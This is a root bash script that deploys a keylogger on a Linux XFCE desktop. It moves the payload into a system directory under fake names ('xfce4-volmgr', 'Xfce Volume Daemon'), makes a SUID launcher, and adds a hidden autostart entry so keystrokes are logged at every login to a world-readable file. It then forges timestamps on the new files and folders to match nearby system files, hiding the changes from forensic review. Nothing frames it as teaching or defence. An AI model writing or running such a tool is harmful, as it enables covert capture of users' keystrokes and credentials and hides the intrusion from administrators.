#!/usr/bin/env bash

if [ $EUID -ne 0 ]; then
	echo "not root"
	exit 1
fi


# Colors                                                                                                           
COLOR_OFF='\033[0m'                                                                                                
BOLD_WHITE='\033[1;37m'                                                                                            
RED='\033[0;31m'                                                                                                   
YELLOW='\033[0;33m'                                                                                                
CYAN='\033[0;36m'                                                                                                  
BLUE='\033[0;34m'                                                                                                  
PURPLE='\033[0;35m'                                                                                                
GREEN='\033[0;32m'                                                                                                 
                                                                                                                   
                                                                                                                   
#######################################                                                                            
# Log colored and status-prefixed text to the terminal depending on the                                            
# user-provided log type.                                                                                          
#                                                                                                                  
# Globals:                                                                                                         
#   All above colors                                                                                               
# Arguments:                                                                                                       
#   Log type, one of "task", "error", "warning", "info", "log", or "debug"
#   Log message, the message to be printed to the terminal
# Outputs:
#   Colored and status-prefixed text otherwise, or usage on error
# Returns:
#   0 if cecho usage was correct, 1 otherwise
########################################
cecho() {
        local cecho_usage="${RED}[!] cecho usage: cecho <task|error|warning|info|log|debug|sep|done> <\"log_message\">${COLOR_OFF}"

        if [ $# -ne 2 ]; then
                echo -e "$cecho_usage"
                return 1
        fi

        local log_type=$1
        local log_message=$2

        case $log_type in
                "task")
                        echo -e "${BOLD_WHITE}[+] --- ${log_message}${COLOR_OFF}"
                        ;;
                "error")
                        echo -e "${RED}[!] ${log_message}${COLOR_OFF}" >&2 # print to STDERR
                        ;;
                "warning")
                        echo -e "${YELLOW}[-] ${log_message}${COLOR_OFF}"
                        ;;
                "info")
                        echo -e "${CYAN}[*] ${log_message}${COLOR_OFF}"
                        ;;
                "log")
                        echo -e "${BLUE}[^] ${log_message}${COLOR_OFF}"
                        ;;
                "debug")
                        echo -e "${PURPLE}[?] ${log_message}${COLOR_OFF}"
                        ;;
                "sep")
                        echo -en "${YELLOW}"
                        for _ in {1..10}; do echo -n "${log_message}"; done
                        echo -e "${COLOR_OFF}"
                        ;;
                "done")
                        echo -e "${GREEN}[=] ${log_message}${COLOR_OFF}"
                        echo
                        ;;
                *)
                        echo -e "$cecho_usage"
                        return 1
                        ;;
        esac
}


get_timestamp() {
        if [ $# -ne 1 ]; then
                cecho error "get_timestamp usage: get_timestamp <file>"
                return 1
        fi

        local file="$1"

        if ! stat -L "$file" \
                | grep "Modify" \
                | cut -d " " -f 2,3 \
                | cut -d ":" -f 1,2 \
                | tr -d "-" \
                | tr -d ":" \
                | tr -d " "; then
                cecho error "Couldn't stat '$file'"
                return 1
        fi
}


set_timestamp() {
        if [ $# -ne 2 ]; then
                cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
                return 1
        fi

        local timestamp="$1"
        local file="$2"

        if ! touch -t "$timestamp" "$file"; then
                cecho error "Couldn't modify timestamp for '$file'"
                return 1
        else
                cecho info "Modified timestamp for '$file'"
        fi
}



LAUNCHER_BASE_DIR="/usr/lib/x86_64-linux-gnu/xfce4"
LAUNCHER_DIR="$LAUNCHER_BASE_DIR/volumed"

LAUNCHER_NAME="xfce4-volumed"
LAUNCHER_PATH="$LAUNCHER_DIR/$LAUNCHER_NAME"

PAYLOAD_NAME="xfce4-volmgr"
PAYLOAD_PATH="$LAUNCHER_DIR/$PAYLOAD_NAME"

PAYLOAD_TMP_NAME="bakps"
PAYLOAD_TMP_PATH="/tmp/$PAYLOAD_TMP_NAME"

LOG_NAME="xfce4-volume.conf"
LOG_PATH="$LAUNCHER_DIR/$LOG_NAME"

XFCE_AUTOSTART_DIR="/etc/xdg/autostart"
XFCE_AUTOSTART_NAME="xfce4-volumed.desktop"
XFCE_AUTOSTART_PATH="$XFCE_AUTOSTART_DIR/$XFCE_AUTOSTART_NAME"

LAUNCHER_CONTENT="#!/usr/bin/env bash
$PAYLOAD_PATH >> $LOG_PATH"

XFCE_AUTOSTART_CONTENT="[Desktop Entry]
Encoding=UTF-8
Type=Application
Name=Xfce Volume Daemon
Icon=utilities-terminal
Exec=$LAUNCHER_PATH
Terminal=false
NoDisplay=true
StartupNotify=false"



cecho task "Deploying keylogger"

if [ ! -f "$PAYLOAD_TMP_PATH" ]; then
	cecho error "Keylogger not located at '$PAYLOAD_TMP_PATH', skipping"
else
	if [ -f "$PAYLOAD_PATH" ]; then
		cecho warning "Keylogger already deployed and located at '$PAYLOAD_PATH', check it out"
	else

		tmp_timestamp=$(get_timestamp "/tmp")
		basedir_timestamp=$(get_timestamp "$LAUNCHER_BASE_DIR")
		basedir_other_timestamp=$(get_timestamp "$LAUNCHER_BASE_DIR/notifyd")
		autostart_timestamp=$(get_timestamp "$XFCE_AUTOSTART_DIR")
		autostart_other_timestamp=$(get_timestamp "$XFCE_AUTOSTART_DIR/xfce4-notifyd.desktop")

		# Create launcher directory
		if ! mkdir -p $LAUNCHER_DIR; then
			cecho error "Couldn't create launcher directory '$LAUNCHER_DIR', exiting"
			set_timestamp $tmp_timestamp "/tmp"

			set_timestamp $basedir_timestamp "$LAUNCHER_BASE_DIR"

			set_timestamp $basedir_other_timestamp "$LAUNCHER_DIR"
			set_timestamp $basedir_other_timestamp "$LAUNCHER_PATH"
			set_timestamp $basedir_other_timestamp "$PAYLOAD_PATH"
			set_timestamp $basedir_other_timestamp "$LOG_PATH"

			set_timestamp $autostart_timestamp "$XFCE_AUTOSTART_DIR"

			set_timestamp $autostart_other_timestamp "$XFCE_AUTOSTART_PATH"
			exit 1
		else
			cecho info "Created launcher directory '$LAUNCHER_DIR'"
		fi

		# Move payload to new launcher directory
		if ! mv -f "$PAYLOAD_TMP_PATH" "$PAYLOAD_PATH"; then
			cecho error "Couldn't move payload to '$PAYLOAD_PATH', exiting"
			set_timestamp $tmp_timestamp "/tmp"

			set_timestamp $basedir_timestamp "$LAUNCHER_BASE_DIR"

			set_timestamp $basedir_other_timestamp "$LAUNCHER_DIR"
			set_timestamp $basedir_other_timestamp "$LAUNCHER_PATH"
			set_timestamp $basedir_other_timestamp "$PAYLOAD_PATH"
			set_timestamp $basedir_other_timestamp "$LOG_PATH"

			set_timestamp $autostart_timestamp "$XFCE_AUTOSTART_DIR"

			set_timestamp $autostart_other_timestamp "$XFCE_AUTOSTART_PATH"
			exit 1
		else
			cecho info "Moved payload to '$PAYLOAD_PATH'"
		fi

		# Make payload executable
		if ! chmod +x "$PAYLOAD_PATH"; then
			cecho error "Couldn't 'chmod +x $PAYLOAD_PATH'"
			set_timestamp $tmp_timestamp "/tmp"

			set_timestamp $basedir_timestamp "$LAUNCHER_BASE_DIR"

			set_timestamp $basedir_other_timestamp "$LAUNCHER_DIR"
			set_timestamp $basedir_other_timestamp "$LAUNCHER_PATH"
			set_timestamp $basedir_other_timestamp "$PAYLOAD_PATH"
			set_timestamp $basedir_other_timestamp "$LOG_PATH"

			set_timestamp $autostart_timestamp "$XFCE_AUTOSTART_DIR"

			set_timestamp $autostart_other_timestamp "$XFCE_AUTOSTART_PATH"
			exit 1
		else
			cecho info "Made '$PAYLOAD_PATH' executable"
		fi

		# Write launcher content
		if ! echo "$LAUNCHER_CONTENT" > "$LAUNCHER_PATH"; then
			cecho error "Couldn't write launcher content to  '$LAUNCHER_PATH', exiting"
			set_timestamp $tmp_timestamp "/tmp"

			set_timestamp $basedir_timestamp "$LAUNCHER_BASE_DIR"

			set_timestamp $basedir_other_timestamp "$LAUNCHER_DIR"
			set_timestamp $basedir_other_timestamp "$LAUNCHER_PATH"
			set_timestamp $basedir_other_timestamp "$PAYLOAD_PATH"
			set_timestamp $basedir_other_timestamp "$LOG_PATH"

			set_timestamp $autostart_timestamp "$XFCE_AUTOSTART_DIR"

			set_timestamp $autostart_other_timestamp "$XFCE_AUTOSTART_PATH"
			exit 1
		else
			cecho info "Wrote launcher content to '$LAUNCHER_PATH'"
		fi

		# Make launcher executable and SUID
		if ! chmod 4755 "$LAUNCHER_PATH"; then
			cecho error "Couldn't 'chmod 4755 $LAUNCHER_PATH'"
			set_timestamp $tmp_timestamp "/tmp"

			set_timestamp $basedir_timestamp "$LAUNCHER_BASE_DIR"

			set_timestamp $basedir_other_timestamp "$LAUNCHER_DIR"
			set_timestamp $basedir_other_timestamp "$LAUNCHER_PATH"
			set_timestamp $basedir_other_timestamp "$PAYLOAD_PATH"
			set_timestamp $basedir_other_timestamp "$LOG_PATH"

			set_timestamp $autostart_timestamp "$XFCE_AUTOSTART_DIR"

			set_timestamp $autostart_other_timestamp "$XFCE_AUTOSTART_PATH"
			exit 1
		else
			cecho info "Made '$LAUNCHER_PATH' executable"
		fi

		# Create log file and allow all to write to and read from it
		if ! (touch "$LOG_PATH" && chmod a+rw "$LOG_PATH"); then
			cecho error "Couldn't create and make writable '$LOG_PATH'"
			set_timestamp $tmp_timestamp "/tmp"

			set_timestamp $basedir_timestamp "$LAUNCHER_BASE_DIR"

			set_timestamp $basedir_other_timestamp "$LAUNCHER_DIR"
			set_timestamp $basedir_other_timestamp "$LAUNCHER_PATH"
			set_timestamp $basedir_other_timestamp "$PAYLOAD_PATH"
			set_timestamp $basedir_other_timestamp "$LOG_PATH"

			set_timestamp $autostart_timestamp "$XFCE_AUTOSTART_DIR"

			set_timestamp $autostart_other_timestamp "$XFCE_AUTOSTART_PATH"
			exit 1
		else
			cecho info "Created and made writable '$LOG_PATH'"
		fi

		# Write autostart content
		if ! echo "$XFCE_AUTOSTART_CONTENT" > "$XFCE_AUTOSTART_PATH"; then
			cecho error "Couldn't write autostart content to '$XFCE_AUTOSTART_PATH', exiting"
			set_timestamp $tmp_timestamp "/tmp"

			set_timestamp $basedir_timestamp "$LAUNCHER_BASE_DIR"

			set_timestamp $basedir_other_timestamp "$LAUNCHER_DIR"
			set_timestamp $basedir_other_timestamp "$LAUNCHER_PATH"
			set_timestamp $basedir_other_timestamp "$PAYLOAD_PATH"
			set_timestamp $basedir_other_timestamp "$LOG_PATH"

			set_timestamp $autostart_timestamp "$XFCE_AUTOSTART_DIR"

			set_timestamp $autostart_other_timestamp "$XFCE_AUTOSTART_PATH"
			exit 1
		else
			cecho info "Wrote autostart content to '$XFCE_AUTOSTART_PATH'"
		fi

		set_timestamp $tmp_timestamp "/tmp"

		set_timestamp $basedir_timestamp "$LAUNCHER_BASE_DIR"

		set_timestamp $basedir_other_timestamp "$LAUNCHER_DIR"
		set_timestamp $basedir_other_timestamp "$LAUNCHER_PATH"
		set_timestamp $basedir_other_timestamp "$PAYLOAD_PATH"
		set_timestamp $basedir_other_timestamp "$LOG_PATH"

		set_timestamp $autostart_timestamp "$XFCE_AUTOSTART_DIR"

		set_timestamp $autostart_other_timestamp "$XFCE_AUTOSTART_PATH"

	fi
fi

cecho done "Done deploying keylogger"

cecho debug "Remember to log all active graphical users out!"
cecho debug "Remember to delete me!"
